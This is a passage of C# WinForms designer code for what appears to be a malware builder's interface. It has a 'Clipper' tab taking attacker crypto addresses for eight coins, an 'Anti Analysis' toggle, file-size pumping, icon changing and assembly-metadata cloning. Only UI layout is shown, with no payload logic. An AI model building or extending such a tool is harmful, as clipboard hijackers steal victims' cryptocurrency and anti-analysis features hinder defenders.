            this.tabAssembly.Controls.Add(this.txtAssemblyVersion2);
            this.tabAssembly.Controls.Add(this.txtAssemblyCompany);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion1);
            this.tabAssembly.Controls.Add(this.txtAssemblyTrademark);
            this.tabAssembly.Location = new System.Drawing.Point(89, 4);
            this.tabAssembly.Margin = new System.Windows.Forms.Padding(0);
            this.tabAssembly.Name = "tabAssembly";
            this.tabAssembly.Size = new System.Drawing.Size(418, 190);
            this.tabAssembly.TabIndex = 2;
            this.tabAssembly.Text = "Assembly";
            // 
            // labelAssemblyVersion
            // 
            this.labelAssemblyVersion.AutoEllipsis = true;
            this.labelAssemblyVersion.Location = new System.Drawing.Point(11, 160);
            this.labelAssemblyVersion.Name = "labelAssemblyVersion";
            this.labelAssemblyVersion.Size = new System.Drawing.Size(57, 17);
            this.labelAssemblyVersion.TabIndex = 22;
            this.labelAssemblyVersion.Text = "Version";
            // 
            // chkAssembly
            // 
            this.chkAssembly.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAssembly.BackColor = System.Drawing.Color.Transparent;
            this.chkAssembly.Checked = false;
            this.chkAssembly.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAssembly.ForeColor = System.Drawing.Color.Black;
            this.chkAssembly.Location = new System.Drawing.Point(14, 12);
            this.chkAssembly.Margin = new System.Windows.Forms.Padding(2);
            this.chkAssembly.Name = "chkAssembly";
            this.chkAssembly.Size = new System.Drawing.Size(111, 24);
            this.chkAssembly.TabIndex = 21;
            this.chkAssembly.Text = "Disabled";
            this.chkAssembly.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAssembly_CheckedChanged);
            // 
            // btnAssemblyRandom
            // 
            this.btnAssemblyRandom.BackColor = System.Drawing.Color.Transparent;
            this.btnAssemblyRandom.Enabled = false;
            this.btnAssemblyRandom.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAssemblyRandom.Location = new System.Drawing.Point(312, 156);
            this.btnAssemblyRandom.Margin = new System.Windows.Forms.Padding(2);
            this.btnAssemblyRandom.Name = "btnAssemblyRandom";
            this.btnAssemblyRandom.Size = new System.Drawing.Size(93, 25);
            this.btnAssemblyRandom.TabIndex = 5;
            this.btnAssemblyRandom.Text = "Randomize";
            this.btnAssemblyRandom.Click += new System.EventHandler(this.btnAssemblyRandom_Click);
            // 
            // txtAssemblyTitle
            // 
            this.txtAssemblyTitle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyTitle.Enabled = false;
            this.txtAssemblyTitle.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyTitle.Location = new System.Drawing.Point(14, 47);
            this.txtAssemblyTitle.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyTitle.MaxLength = 32767;
            this.txtAssemblyTitle.MultiLine = false;
            this.txtAssemblyTitle.Name = "txtAssemblyTitle";
            this.txtAssemblyTitle.ReadOnly = false;
            this.txtAssemblyTitle.Size = new System.Drawing.Size(194, 24);
            this.txtAssemblyTitle.TabIndex = 0;
            this.txtAssemblyTitle.Text = "Title...";
            this.txtAssemblyTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyTitle.UseSystemPasswordChar = false;
            this.txtAssemblyTitle.WordWrap = false;
            // 
            // btnAssemblyClone
            // 
            this.btnAssemblyClone.BackColor = System.Drawing.Color.Transparent;
            this.btnAssemblyClone.Enabled = false;
            this.btnAssemblyClone.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAssemblyClone.Location = new System.Drawing.Point(212, 156);
            this.btnAssemblyClone.Margin = new System.Windows.Forms.Padding(2);
            this.btnAssemblyClone.Name = "btnAssemblyClone";
            this.btnAssemblyClone.Size = new System.Drawing.Size(93, 25);
            this.btnAssemblyClone.TabIndex = 6;
            this.btnAssemblyClone.Text = "Clone File";
            this.btnAssemblyClone.Click += new System.EventHandler(this.btnAssemblyClone_Click);
            // 
            // txtAssemblyProduct
            // 
            this.txtAssemblyProduct.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyProduct.Enabled = false;
            this.txtAssemblyProduct.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyProduct.Location = new System.Drawing.Point(212, 47);
            this.txtAssemblyProduct.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyProduct.MaxLength = 32767;
            this.txtAssemblyProduct.MultiLine = false;
            this.txtAssemblyProduct.Name = "txtAssemblyProduct";
            this.txtAssemblyProduct.ReadOnly = false;
            this.txtAssemblyProduct.Size = new System.Drawing.Size(194, 24);
            this.txtAssemblyProduct.TabIndex = 0;
            this.txtAssemblyProduct.Text = "Product...";
            this.txtAssemblyProduct.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyProduct.UseSystemPasswordChar = false;
            this.txtAssemblyProduct.WordWrap = false;
            // 
            // txtAssemblyVersion4
            // 
            this.txtAssemblyVersion4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion4.Enabled = false;
            this.txtAssemblyVersion4.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion4.Location = new System.Drawing.Point(176, 157);
            this.txtAssemblyVersion4.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion4.MaxLength = 32767;
            this.txtAssemblyVersion4.MultiLine = false;
            this.txtAssemblyVersion4.Name = "txtAssemblyVersion4";
            this.txtAssemblyVersion4.ReadOnly = false;
            this.txtAssemblyVersion4.Size = new System.Drawing.Size(32, 24);
            this.txtAssemblyVersion4.TabIndex = 1;
            this.txtAssemblyVersion4.Text = "0";
            this.txtAssemblyVersion4.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion4.UseSystemPasswordChar = false;
            this.txtAssemblyVersion4.WordWrap = false;
            // 
            // txtAssemblyDescription
            // 
            this.txtAssemblyDescription.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyDescription.Enabled = false;
            this.txtAssemblyDescription.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyDescription.Location = new System.Drawing.Point(14, 83);
            this.txtAssemblyDescription.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyDescription.MaxLength = 32767;
            this.txtAssemblyDescription.MultiLine = false;
            this.txtAssemblyDescription.Name = "txtAssemblyDescription";
            this.txtAssemblyDescription.ReadOnly = false;
            this.txtAssemblyDescription.Size = new System.Drawing.Size(194, 24);
            this.txtAssemblyDescription.TabIndex = 0;
            this.txtAssemblyDescription.Text = "Description...";
            this.txtAssemblyDescription.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyDescription.UseSystemPasswordChar = false;
            this.txtAssemblyDescription.WordWrap = false;
            // 
            // txtAssemblyVersion3
            // 
            this.txtAssemblyVersion3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion3.Enabled = false;
            this.txtAssemblyVersion3.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion3.Location = new System.Drawing.Point(139, 157);
            this.txtAssemblyVersion3.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion3.MaxLength = 32767;
            this.txtAssemblyVersion3.MultiLine = false;
            this.txtAssemblyVersion3.Name = "txtAssemblyVersion3";
            this.txtAssemblyVersion3.ReadOnly = false;
            this.txtAssemblyVersion3.Size = new System.Drawing.Size(33, 24);
            this.txtAssemblyVersion3.TabIndex = 2;
            this.txtAssemblyVersion3.Text = "0";
            this.txtAssemblyVersion3.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion3.UseSystemPasswordChar = false;
            this.txtAssemblyVersion3.WordWrap = false;
            // 
            // txtAssemblyCopyright
            // 
            this.txtAssemblyCopyright.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyCopyright.Enabled = false;
            this.txtAssemblyCopyright.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyCopyright.Location = new System.Drawing.Point(212, 83);
            this.txtAssemblyCopyright.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyCopyright.MaxLength = 32767;
            this.txtAssemblyCopyright.MultiLine = false;
            this.txtAssemblyCopyright.Name = "txtAssemblyCopyright";
            this.txtAssemblyCopyright.ReadOnly = false;
            this.txtAssemblyCopyright.Size = new System.Drawing.Size(194, 24);
            this.txtAssemblyCopyright.TabIndex = 0;
            this.txtAssemblyCopyright.Text = "Copyright...";
            this.txtAssemblyCopyright.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyCopyright.UseSystemPasswordChar = false;
            this.txtAssemblyCopyright.WordWrap = false;
            // 
            // txtAssemblyVersion2
            // 
            this.txtAssemblyVersion2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion2.Enabled = false;
            this.txtAssemblyVersion2.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion2.Location = new System.Drawing.Point(106, 157);
            this.txtAssemblyVersion2.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion2.MaxLength = 32767;
            this.txtAssemblyVersion2.MultiLine = false;
            this.txtAssemblyVersion2.Name = "txtAssemblyVersion2";
            this.txtAssemblyVersion2.ReadOnly = false;
            this.txtAssemblyVersion2.Size = new System.Drawing.Size(29, 24);
            this.txtAssemblyVersion2.TabIndex = 3;
            this.txtAssemblyVersion2.Text = "0";
            this.txtAssemblyVersion2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion2.UseSystemPasswordChar = false;
            this.txtAssemblyVersion2.WordWrap = false;
            // 
            // txtAssemblyCompany
            // 
            this.txtAssemblyCompany.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyCompany.Enabled = false;
            this.txtAssemblyCompany.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyCompany.Location = new System.Drawing.Point(14, 119);
            this.txtAssemblyCompany.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyCompany.MaxLength = 32767;
            this.txtAssemblyCompany.MultiLine = false;
            this.txtAssemblyCompany.Name = "txtAssemblyCompany";
            this.txtAssemblyCompany.ReadOnly = false;
            this.txtAssemblyCompany.Size = new System.Drawing.Size(194, 24);
            this.txtAssemblyCompany.TabIndex = 0;
            this.txtAssemblyCompany.Text = "Company...";
            this.txtAssemblyCompany.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyCompany.UseSystemPasswordChar = false;
            this.txtAssemblyCompany.WordWrap = false;
            // 
            // txtAssemblyVersion1
            // 
            this.txtAssemblyVersion1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion1.Enabled = false;
            this.txtAssemblyVersion1.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion1.Location = new System.Drawing.Point(69, 157);
            this.txtAssemblyVersion1.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion1.MaxLength = 32767;
            this.txtAssemblyVersion1.MultiLine = false;
            this.txtAssemblyVersion1.Name = "txtAssemblyVersion1";
            this.txtAssemblyVersion1.ReadOnly = false;
            this.txtAssemblyVersion1.Size = new System.Drawing.Size(33, 24);
            this.txtAssemblyVersion1.TabIndex = 4;
            this.txtAssemblyVersion1.Text = "0";
            this.txtAssemblyVersion1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion1.UseSystemPasswordChar = false;
            this.txtAssemblyVersion1.WordWrap = false;
            // 
            // txtAssemblyTrademark
            // 
            this.txtAssemblyTrademark.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyTrademark.Enabled = false;
            this.txtAssemblyTrademark.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyTrademark.Location = new System.Drawing.Point(212, 119);
            this.txtAssemblyTrademark.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyTrademark.MaxLength = 32767;
            this.txtAssemblyTrademark.MultiLine = false;
            this.txtAssemblyTrademark.Name = "txtAssemblyTrademark";
            this.txtAssemblyTrademark.ReadOnly = false;
            this.txtAssemblyTrademark.Size = new System.Drawing.Size(194, 24);
            this.txtAssemblyTrademark.TabIndex = 0;
            this.txtAssemblyTrademark.Text = "Trademark...";
            this.txtAssemblyTrademark.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyTrademark.UseSystemPasswordChar = false;
            this.txtAssemblyTrademark.WordWrap = false;
            // 
            // tabClipper
            // 
            this.tabClipper.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabClipper.Controls.Add(this.chkClipperXLM);
            this.tabClipper.Controls.Add(this.chkClipperDASH);
            this.tabClipper.Controls.Add(this.chkClipperDOGE);
            this.tabClipper.Controls.Add(this.chkClipperBCH);
            this.tabClipper.Controls.Add(this.chkClipperXMR);
            this.tabClipper.Controls.Add(this.chkClipperLTC);
            this.tabClipper.Controls.Add(this.chkClipperETH);
            this.tabClipper.Controls.Add(this.chkClipperBTC);
            this.tabClipper.Controls.Add(this.txtClipperXMR);
            this.tabClipper.Controls.Add(this.txtClipperXLM);
            this.tabClipper.Controls.Add(this.chkClipper);
            this.tabClipper.Controls.Add(this.txtClipperBTC);
            this.tabClipper.Controls.Add(this.txtClipperBCH);
            this.tabClipper.Controls.Add(this.txtClipperETH);
            this.tabClipper.Controls.Add(this.txtClipperDOGE);
            this.tabClipper.Controls.Add(this.txtClipperLTC);
            this.tabClipper.Controls.Add(this.txtClipperDASH);
            this.tabClipper.Location = new System.Drawing.Point(89, 4);
            this.tabClipper.Margin = new System.Windows.Forms.Padding(0);
            this.tabClipper.Name = "tabClipper";
            this.tabClipper.Size = new System.Drawing.Size(418, 190);
            this.tabClipper.TabIndex = 3;
            this.tabClipper.Text = "Clipper";
            // 
            // chkClipperXLM
            // 
            this.chkClipperXLM.BackColor = System.Drawing.Color.Transparent;
            this.chkClipperXLM.Checked = true;
            this.chkClipperXLM.ForeColor = System.Drawing.Color.Black;
            this.chkClipperXLM.Location = new System.Drawing.Point(356, 155);
            this.chkClipperXLM.Margin = new System.Windows.Forms.Padding(2);
            this.chkClipperXLM.Name = "chkClipperXLM";
            this.chkClipperXLM.Size = new System.Drawing.Size(50, 24);
            this.chkClipperXLM.TabIndex = 116;
            // 
            // chkClipperDASH
            // 
            this.chkClipperDASH.BackColor = System.Drawing.Color.Transparent;
            this.chkClipperDASH.Checked = true;
            this.chkClipperDASH.ForeColor = System.Drawing.Color.Black;
            this.chkClipperDASH.Location = new System.Drawing.Point(356, 119);
            this.chkClipperDASH.Margin = new System.Windows.Forms.Padding(2);
            this.chkClipperDASH.Name = "chkClipperDASH";
            this.chkClipperDASH.Size = new System.Drawing.Size(50, 24);
            this.chkClipperDASH.TabIndex = 115;
            // 
            // chkClipperDOGE
            // 
            this.chkClipperDOGE.BackColor = System.Drawing.Color.Transparent;
            this.chkClipperDOGE.Checked = true;
            this.chkClipperDOGE.ForeColor = System.Drawing.Color.Black;
            this.chkClipperDOGE.Location = new System.Drawing.Point(356, 83);
            this.chkClipperDOGE.Margin = new System.Windows.Forms.Padding(2);
            this.chkClipperDOGE.Name = "chkClipperDOGE";
            this.chkClipperDOGE.Size = new System.Drawing.Size(50, 24);
            this.chkClipperDOGE.TabIndex = 114;
            // 
            // chkClipperBCH
            // 
            this.chkClipperBCH.BackColor = System.Drawing.Color.Transparent;
            this.chkClipperBCH.Checked = true;
            this.chkClipperBCH.ForeColor = System.Drawing.Color.Black;
            this.chkClipperBCH.Location = new System.Drawing.Point(356, 46);
            this.chkClipperBCH.Margin = new System.Windows.Forms.Padding(2);
            this.chkClipperBCH.Name = "chkClipperBCH";
            this.chkClipperBCH.Size = new System.Drawing.Size(50, 24);
            this.chkClipperBCH.TabIndex = 113;
            // 
            // chkClipperXMR
            // 
            this.chkClipperXMR.BackColor = System.Drawing.Color.Transparent;
            this.chkClipperXMR.Checked = true;
            this.chkClipperXMR.ForeColor = System.Drawing.Color.Black;
            this.chkClipperXMR.Location = new System.Drawing.Point(158, 155);
            this.chkClipperXMR.Margin = new System.Windows.Forms.Padding(2);
            this.chkClipperXMR.Name = "chkClipperXMR";
            this.chkClipperXMR.Size = new System.Drawing.Size(50, 24);
            this.chkClipperXMR.TabIndex = 112;
            // 
            // chkClipperLTC
            // 
            this.chkClipperLTC.BackColor = System.Drawing.Color.Transparent;
            this.chkClipperLTC.Checked = true;
            this.chkClipperLTC.ForeColor = System.Drawing.Color.Black;
            this.chkClipperLTC.Location = new System.Drawing.Point(158, 119);
            this.chkClipperLTC.Margin = new System.Windows.Forms.Padding(2);
            this.chkClipperLTC.Name = "chkClipperLTC";
            this.chkClipperLTC.Size = new System.Drawing.Size(50, 24);
            this.chkClipperLTC.TabIndex = 111;
            // 
            // chkClipperETH
            // 
            this.chkClipperETH.BackColor = System.Drawing.Color.Transparent;
            this.chkClipperETH.Checked = true;
            this.chkClipperETH.ForeColor = System.Drawing.Color.Black;
            this.chkClipperETH.Location = new System.Drawing.Point(158, 83);
            this.chkClipperETH.Margin = new System.Windows.Forms.Padding(2);
            this.chkClipperETH.Name = "chkClipperETH";
            this.chkClipperETH.Size = new System.Drawing.Size(50, 24);
            this.chkClipperETH.TabIndex = 110;
            // 
            // chkClipperBTC
            // 
            this.chkClipperBTC.BackColor = System.Drawing.Color.Transparent;
            this.chkClipperBTC.Checked = true;
            this.chkClipperBTC.ForeColor = System.Drawing.Color.Black;
            this.chkClipperBTC.Location = new System.Drawing.Point(158, 46);
            this.chkClipperBTC.Margin = new System.Windows.Forms.Padding(2);
            this.chkClipperBTC.Name = "chkClipperBTC";
            this.chkClipperBTC.Size = new System.Drawing.Size(50, 24);
            this.chkClipperBTC.TabIndex = 109;
            this.chkClipperBTC.CheckedChanged += new MephToggleSwitch.CheckedChangedEventHandler(this.chkClipperBTC_CheckedChanged);
            // 
            // txtClipperXMR
            // 
            this.txtClipperXMR.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtClipperXMR.ForeColor = System.Drawing.Color.Silver;
            this.txtClipperXMR.Location = new System.Drawing.Point(14, 155);
            this.txtClipperXMR.Margin = new System.Windows.Forms.Padding(2);
            this.txtClipperXMR.MaxLength = 32767;
            this.txtClipperXMR.MultiLine = false;
            this.txtClipperXMR.Name = "txtClipperXMR";
            this.txtClipperXMR.ReadOnly = false;
            this.txtClipperXMR.Size = new System.Drawing.Size(140, 24);
            this.txtClipperXMR.TabIndex = 29;
            this.txtClipperXMR.Text = "XMR Address";
            this.txtClipperXMR.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtClipperXMR.UseSystemPasswordChar = false;
            this.txtClipperXMR.WordWrap = false;
            // 
            // txtClipperXLM
            // 
            this.txtClipperXLM.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtClipperXLM.ForeColor = System.Drawing.Color.Silver;
            this.txtClipperXLM.Location = new System.Drawing.Point(212, 155);
            this.txtClipperXLM.Margin = new System.Windows.Forms.Padding(2);
            this.txtClipperXLM.MaxLength = 32767;
            this.txtClipperXLM.MultiLine = false;
            this.txtClipperXLM.Name = "txtClipperXLM";
            this.txtClipperXLM.ReadOnly = false;
            this.txtClipperXLM.Size = new System.Drawing.Size(140, 24);
            this.txtClipperXLM.TabIndex = 30;
            this.txtClipperXLM.Text = "XLM Address";
            this.txtClipperXLM.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtClipperXLM.UseSystemPasswordChar = false;
            this.txtClipperXLM.WordWrap = false;
            // 
            // chkClipper
            // 
            this.chkClipper.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkClipper.BackColor = System.Drawing.Color.Transparent;
            this.chkClipper.Checked = true;
            this.chkClipper.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkClipper.ForeColor = System.Drawing.Color.Black;
            this.chkClipper.Location = new System.Drawing.Point(14, 12);
            this.chkClipper.Margin = new System.Windows.Forms.Padding(2);
            this.chkClipper.Name = "chkClipper";
            this.chkClipper.Size = new System.Drawing.Size(111, 24);
            this.chkClipper.TabIndex = 28;
            this.chkClipper.Text = "Enabled";
            this.chkClipper.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkClipper_CheckedChanged);
            // 
            // txtClipperBTC
            // 
            this.txtClipperBTC.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtClipperBTC.ForeColor = System.Drawing.Color.Silver;
            this.txtClipperBTC.Location = new System.Drawing.Point(14, 47);
            this.txtClipperBTC.Margin = new System.Windows.Forms.Padding(2);
            this.txtClipperBTC.MaxLength = 32767;
            this.txtClipperBTC.MultiLine = false;
            this.txtClipperBTC.Name = "txtClipperBTC";
            this.txtClipperBTC.ReadOnly = false;
            this.txtClipperBTC.Size = new System.Drawing.Size(140, 24);
            this.txtClipperBTC.TabIndex = 22;
            this.txtClipperBTC.Text = "BTC Address";
            this.txtClipperBTC.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtClipperBTC.UseSystemPasswordChar = false;
            this.txtClipperBTC.WordWrap = false;
            // 
            // txtClipperBCH
            // 
            this.txtClipperBCH.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtClipperBCH.ForeColor = System.Drawing.Color.Silver;
            this.txtClipperBCH.Location = new System.Drawing.Point(212, 47);
            this.txtClipperBCH.Margin = new System.Windows.Forms.Padding(2);
            this.txtClipperBCH.MaxLength = 32767;
            this.txtClipperBCH.MultiLine = false;
            this.txtClipperBCH.Name = "txtClipperBCH";
            this.txtClipperBCH.ReadOnly = false;
            this.txtClipperBCH.Size = new System.Drawing.Size(140, 24);
            this.txtClipperBCH.TabIndex = 23;
            this.txtClipperBCH.Text = "BCH Address";
            this.txtClipperBCH.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtClipperBCH.UseSystemPasswordChar = false;
            this.txtClipperBCH.WordWrap = false;
            // 
            // txtClipperETH
            // 
            this.txtClipperETH.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtClipperETH.ForeColor = System.Drawing.Color.Silver;
            this.txtClipperETH.Location = new System.Drawing.Point(14, 83);
            this.txtClipperETH.Margin = new System.Windows.Forms.Padding(2);
            this.txtClipperETH.MaxLength = 32767;
            this.txtClipperETH.MultiLine = false;
            this.txtClipperETH.Name = "txtClipperETH";
            this.txtClipperETH.ReadOnly = false;
            this.txtClipperETH.Size = new System.Drawing.Size(140, 24);
            this.txtClipperETH.TabIndex = 24;
            this.txtClipperETH.Text = "ETH Address";
            this.txtClipperETH.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtClipperETH.UseSystemPasswordChar = false;
            this.txtClipperETH.WordWrap = false;
            // 
            // txtClipperDOGE
            // 
            this.txtClipperDOGE.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtClipperDOGE.ForeColor = System.Drawing.Color.Silver;
            this.txtClipperDOGE.Location = new System.Drawing.Point(212, 83);
            this.txtClipperDOGE.Margin = new System.Windows.Forms.Padding(2);
            this.txtClipperDOGE.MaxLength = 32767;
            this.txtClipperDOGE.MultiLine = false;
            this.txtClipperDOGE.Name = "txtClipperDOGE";
            this.txtClipperDOGE.ReadOnly = false;
            this.txtClipperDOGE.Size = new System.Drawing.Size(140, 24);
            this.txtClipperDOGE.TabIndex = 25;
            this.txtClipperDOGE.Text = "DOGE Address";
            this.txtClipperDOGE.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtClipperDOGE.UseSystemPasswordChar = false;
            this.txtClipperDOGE.WordWrap = false;
            // 
            // txtClipperLTC
            // 
            this.txtClipperLTC.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtClipperLTC.ForeColor = System.Drawing.Color.Silver;
            this.txtClipperLTC.Location = new System.Drawing.Point(14, 119);
            this.txtClipperLTC.Margin = new System.Windows.Forms.Padding(2);
            this.txtClipperLTC.MaxLength = 32767;
            this.txtClipperLTC.MultiLine = false;
            this.txtClipperLTC.Name = "txtClipperLTC";
            this.txtClipperLTC.ReadOnly = false;
            this.txtClipperLTC.Size = new System.Drawing.Size(140, 24);
            this.txtClipperLTC.TabIndex = 26;
            this.txtClipperLTC.Text = "LTC Address";
            this.txtClipperLTC.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtClipperLTC.UseSystemPasswordChar = false;
            this.txtClipperLTC.WordWrap = false;
            // 
            // txtClipperDASH
            // 
            this.txtClipperDASH.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtClipperDASH.ForeColor = System.Drawing.Color.Silver;
            this.txtClipperDASH.Location = new System.Drawing.Point(212, 119);
            this.txtClipperDASH.Margin = new System.Windows.Forms.Padding(2);
            this.txtClipperDASH.MaxLength = 32767;
            this.txtClipperDASH.MultiLine = false;
            this.txtClipperDASH.Name = "txtClipperDASH";
            this.txtClipperDASH.ReadOnly = false;
            this.txtClipperDASH.Size = new System.Drawing.Size(140, 24);
            this.txtClipperDASH.TabIndex = 27;
            this.txtClipperDASH.Text = "DASH Address";
            this.txtClipperDASH.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtClipperDASH.UseSystemPasswordChar = false;
            this.txtClipperDASH.WordWrap = false;
            // 
            // tabOptions
            // 
            this.tabOptions.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabOptions.Controls.Add(this.labelAntiAnalysis);
            this.tabOptions.Controls.Add(this.chkAntiAnalysis);
            this.tabOptions.Controls.Add(this.txtPumpSize);
            this.tabOptions.Controls.Add(this.label3);
            this.tabOptions.Controls.Add(this.chkIcon);
            this.tabOptions.Controls.Add(this.picIcon);
            this.tabOptions.Controls.Add(this.btnIconBrowse);
            this.tabOptions.Controls.Add(this.txtIconPath);
            this.tabOptions.Controls.Add(this.btnAdvancedOptions);
            this.tabOptions.Controls.Add(this.labelDisableSleep);
            this.tabOptions.Controls.Add(this.toggleDisableSleep);
            this.tabOptions.Controls.Add(this.labelOptionAdministrator);
            this.tabOptions.Controls.Add(this.toggleAdministrator);
            this.tabOptions.Location = new System.Drawing.Point(89, 4);
            this.tabOptions.Name = "tabOptions";
            this.tabOptions.Size = new System.Drawing.Size(418, 190);
            this.tabOptions.TabIndex = 5;
            this.tabOptions.Text = "Options";
            // 
            // labelAntiAnalysis
            // 
            this.labelAntiAnalysis.AutoEllipsis = true;
            this.labelAntiAnalysis.BackColor = System.Drawing.Color.Transparent;
            this.labelAntiAnalysis.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelAntiAnalysis.ForeColor = System.Drawing.Color.Gray;
            this.labelAntiAnalysis.Location = new System.Drawing.Point(9, 14);
            this.labelAntiAnalysis.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelAntiAnalysis.Name = "labelAntiAnalysis";
            this.labelAntiAnalysis.Size = new System.Drawing.Size(162, 17);
            this.labelAntiAnalysis.TabIndex = 156;
            this.labelAntiAnalysis.Text = "Anti Analysis";
            // 
            // chkAntiAnalysis
            // 
            this.chkAntiAnalysis.BackColor = System.Drawing.Color.Transparent;
            this.chkAntiAnalysis.Checked = true;
            this.chkAntiAnalysis.ForeColor = System.Drawing.Color.Black;
            this.chkAntiAnalysis.Location = new System.Drawing.Point(175, 11);
            this.chkAntiAnalysis.Margin = new System.Windows.Forms.Padding(2);
            this.chkAntiAnalysis.Name = "chkAntiAnalysis";
            this.chkAntiAnalysis.Size = new System.Drawing.Size(50, 24);
            this.chkAntiAnalysis.TabIndex = 155;
            // 
            // txtPumpSize
            // 
            this.txtPumpSize.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPumpSize.ForeColor = System.Drawing.Color.Silver;
            this.txtPumpSize.Location = new System.Drawing.Point(175, 74);
            this.txtPumpSize.Margin = new System.Windows.Forms.Padding(2);
            this.txtPumpSize.MaxLength = 32767;
            this.txtPumpSize.MultiLine = false;
            this.txtPumpSize.Name = "txtPumpSize";
            this.txtPumpSize.ReadOnly = false;
            this.txtPumpSize.Size = new System.Drawing.Size(50, 24);
